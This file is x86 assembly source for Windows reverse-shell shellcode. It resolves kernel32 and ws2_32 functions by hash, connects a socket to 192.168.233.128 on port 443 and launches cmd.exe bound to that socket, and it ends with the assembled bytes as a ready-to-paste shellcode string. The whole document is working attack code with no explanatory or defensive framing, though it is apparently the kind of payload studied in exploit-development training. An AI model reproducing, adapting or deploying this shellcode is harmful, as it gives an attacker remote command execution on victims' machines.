global _start:

_start:
    mov ebp, esp                    ; new stack frame
    sub esp, 0x28                   ; space for variables

    .find_kernel32:
        xor ecx, ecx                ; TEB structure
        mov esi, [fs: ecx + 0x30]   ; PEB Address
        mov esi, [esi + 0xc]        ; ntdll!PebLdr
        mov esi, [esi + 0x1c]       ; InInitializationOrderModuleList

    .next_module:
        mov ebx, [esi + 0x8]        ; Base address
        mov edi, [esi + 0x20]       ; Module name
        mov esi, [esi]              ; Next element
        cmp cx, [edi + 0x18]        ; len("kernel32.dll") * 2 [end = 0x0000]
        jnz .next_module            ; if zf == 0

        jmp .find_short             ; short jump

    .find_ret:
        pop esi                     ; $esi = return addr
        mov [ebp - 0x8], esi        ; var8 = .find_function
        jmp .symbol_kernel32        ; load function from kernel32

    .find_short:
        call .find_ret              ; relative call

    .find_function:
        pusha                       ; save all registers
        mov eax, [ebx + 0x3c]       ; RVA to PE signature
        mov edi, [ebx + eax + 0x78] ; RVA of Export Table
        add edi, ebx                ; Export Table
        mov ecx, [edi + 0x18]       ; NR of Names
        mov eax, [edi + 0x20]       ; RVA of Name Pointer Table
        add eax, ebx                ; Name Pointer Table
        mov [ebp - 0x4], eax        ; var4 = Name Pointer Table

    .find_loop:
        jecxz .find_end             ; if ecx = 0x0
        dec ecx                     ; counter -= 1
        mov eax, [ebp - 0x4]        ; $eax = Name Pointer Table
        mov esi, [eax + ecx * 4]    ; RVA of symbol name
        add esi, ebx                ; symbol name

        xor eax, eax                ; $eax = 0x0
        cdq                         ; $edx = 0x0
        cld                         ; DF = 0

    .compute_hash:
        lodsb                       ; load in al next byte from esi
        test al, al                 ; check null terminator
        jz .compare_hash            ; If ZF == 1
        ror edx, 0xd                ; rot 13
        add edx, eax                ; add new byte
        jmp .compute_hash           ; loop

   .compare_hash:
        cmp edx, [esp + 0x24]       ; cmp edx, hash
        jnz .find_loop              ; if zf != 1
        mov edx, [edi + 0x24]       ; RVA of Ordinal Table
        add edx, ebx                ; Ordinal Table
        mov cx, [edx + 2 * ecx]     ; Extrapolate ordinal functions
        mov edx, [edi + 0x1c]       ; RVA of Address Table
        add edx, ebx                ; Address Table
        mov eax, [edx + 4 * ecx]    ; RVA of function
        add eax, ebx                ; function
        mov [esp + 0x1c], eax       ; Overwrite eax from pushad

    .find_end:
        popa                        ; restore registers
        ret                         ; return

    .symbol_kernel32:
        push 0x78b5b983             ; TerminateProcess() hash
        call [ebp - 0x8]            ; call .find_function
        mov [ebp - 0xc], eax        ; var12 = ptr to TerminateProcess()

        push 0xec0e4e8e             ; LoadLibraryA() hash
        call [ebp - 0x8]            ; call .find_function
        mov [ebp - 0x10], eax       ; var16 = ptr to LoadLibraryA()

        push 0x16b3fe72             ; CreateProcessA() hash
        call [ebp - 0x8]            ; call .find_function
        mov [ebp - 0x14], eax       ; var20 = ptr to CreateProcessA()

    .load_ws2_32:
        xor eax, eax                ; $eax = 0x0
        mov ax, 0x6c6c              ; "ll"
        push eax                    ; "ll\x00\x00"
        push 0x642e3233             ; "32.d"
        push 0x5f327377             ; "ws2_"
        push esp                    ; "ws2_32.dll"
        call [ebp - 0x10]           ; call LoadLibraryA()

    .symbol_ws2_32:
        mov ebx, eax                ; $ebx = ws2_32 base

        push 0x3bfcedcb             ; WSAStartup() hash
        call [ebp - 0x8]            ; call .find_function
        mov [ebp - 0x18], eax       ; var24 = ptr to WSAStartup()

        push 0xadf509d9             ; WSASocketA() hash
        call [ebp - 0x8]            ; call .find_function
        mov [ebp - 0x1c], eax       ; var28 = ptr to WSASocketA()

        push 0xb32dba0c             ; WSAConnect() hash
        call [ebp - 0x8]            ; call .find_function
        mov [ebp - 0x20], eax       ; var32 = ptr to WSAConnect()

    .call_wsastartup:
        mov eax, esp                ; $eax = $esp
        xor ecx, ecx                ; $ecx = 0x0
        mov cx, 0x590               ; $ecx = 0x590
        sub eax, ecx                ; sub ecx to avoid overwriting
        push eax                    ; lpWSAData
        xor eax, eax                ; $eax = 0x0
        mov ax, 0x0202              ; $eax = 0x00000202
        push eax                    ; wVersionRequired
        call [ebp - 0x18]           ; call WSAStartup()

    .call_wsasocketa:
        xor eax, eax                ; $eax = 0x0
        push eax                    ; dwFlags
        push eax                    ; g
        push eax                    ; lpProtocolInfo
        mov al, 0x6                 ; IPPROTO_TCP
        push eax                    ; protocol
        mov al, 0x1                 ; SOCK_STREAM
        push eax                    ; type
        inc eax                     ; AF_INET
        push eax                    ; af
        call [ebp - 0x1c]           ; call WSASocketA()

    .call_wsaconnect:
        mov esi, eax                ; socket descriptor
        xor eax, eax                ; $eax = 0x0
        push eax                    ; sin_zero[]
        push eax                    ; sin_zero[]
        push 0x80e9a8c0             ; "192.168.233.128"
        mov ax, 0xbb01              ; 443
        shl eax, 0x10               ; shift eax
        add ax, 0x2                 ; add 0x2
        push eax                    ; sin_port & sin_family
        mov edi, esp                ; $edi = sockaddr_in

        xor eax, eax                ; $eax = 0x0
        push eax                    ; lpGQOS
        push eax                    ; lpSQOS
        push eax                    ; lpCalleeData
        push eax                    ; lpCallerData
        mov al, 0x10                ; $eax = 0x10
        push eax                    ; namelen
        push edi                    ; name
        push esi                    ; s
        call [ebp - 0x20]           ; call WSAConnect()

    .create_startupinfoa:
        push esi                    ; hStdError
        push esi                    ; hStdOutput
        push esi                    ; hStdInput
        xor eax, eax                ; $eax = 0x0
        push eax                    ; lpReserved2
        push eax                    ; cbReserved2 & wShowWindow
        mov ax, 0x101               ; $eax = 0x101
        dec eax                     ; $eax = 0x100
        push eax                    ; dwFlags
        xor eax, eax                ; $eax = 0x0
        push eax                    ; dwFillAttribute
        push eax                    ; dwYCountChars
        push eax                    ; dwXCountChars
        push eax                    ; dwYSize
        push eax                    ; dwXSize
        push eax                    ; dwY
        push eax                    ; dwX
        push eax                    ; lpTitle
        push eax                    ; lpDesktop
        push eax                    ; lpReserved
        mov al, 0x44                ; $eax = 0x44
        push eax                    ; cb
        mov edi, esp                ; $edi = startupinfoa

    .create_string:
        mov eax, 0xff9a879b         ; $eax = 0xff9a879b
        neg eax                     ; $eax = 0x00657865
        push eax                    ; "exe\x00"
        push 0x2e646d63             ; "cmd."
        mov ebx, esp                ; $ebx = "cmd.exe"

    .call_createprocessa:
        mov eax, esp                ; $eax = $esp
        xor ecx, ecx                ; $ecx = 0x0
        mov cx, 0x390               ; $ecx = 0x390
        sub eax, ecx                ; sub cx to avoid overwriting
        push eax                    ; lpProcessInformation
        push edi                    ; lpStartupInfo
        xor eax, eax                ; $eax = 0x0
        push eax                    ; lpCurrentDirectory
        push eax                    ; lpEnvironment
        push eax                    ; dwCreationFlags
        inc eax                     ; $eax = 0x1 (TRUE)
        push eax                    ; bInheritHandles
        dec eax                     ; $eax = 0x0
        push eax                    ; lpThreadAttributes
        push eax                    ; lpProcessAttributes
        push ebx                    ; lpCommandLine
        push eax                    ; lpApplicationName
        call [ebp - 0x14]           ; call CreateProcessA()

    .exit:
        xor ecx, ecx                ; $ecx = 0x0
        push ecx                    ; uExitCode
        push 0xffffffff             ; hProcess
        call [ebp - 0xc]            ; call TerminateProcess()

; shellcode = b"\x89\xe5\x83\xec\x28\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x3b\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\xf8\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x83\xb9\xb5\x78\xff\x55\xf8\x89\x45\xf4\x68\x8e\x4e\x0e\xec\xff\x55\xf8\x89\x45\xf0\x68\x72\xfe\xb3\x16\xff\x55\xf8\x89\x45\xec\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\x55\xf0\x89\xc3\x68\xcb\xed\xfc\x3b\xff\x55\xf8\x89\x45\xe8\x68\xd9\x09\xf5\xad\xff\x55\xf8\x89\x45\xe4\x68\x0c\xba\x2d\xb3\xff\x55\xf8\x89\x45\xe0\x89\xe0\x31\xc9\x66\xb9\x90\x05\x29\xc8\x50\x31\xc0\x66\xb8\x02\x02\x50\xff\x55\xe8\x31\xc0\x50\x50\x50\xb0\x06\x50\xb0\x01\x50\x40\x50\xff\x55\xe4\x89\xc6\x31\xc0\x50\x50\x68\xc0\xa8\xe9\x80\x66\xb8\x01\xbb\xc1\xe0\x10\x66\x83\xc0\x02\x50\x89\xe7\x31\xc0\x50\x50\x50\x50\xb0\x10\x50\x57\x56\xff\x55\xe0\x56\x56\x56\x31\xc0\x50\x50\x66\xb8\x01\x01\x48\x50\x31\xc0\x50\x50\x50\x50\x50\x50\x50\x50\x50\x50\xb0\x44\x50\x89\xe7\xb8\x9b\x87\x9a\xff\xf7\xd8\x50\x68\x63\x6d\x64\x2e\x89\xe3\x89\xe0\x31\xc9\x66\xb9\x90\x03\x29\xc8\x50\x57\x31\xc0\x50\x50\x50\x40\x50\x48\x50\x50\x53\x50\xff\x55\xec\x31\xc9\x51\x6a\xff\xff\x55\xf4"
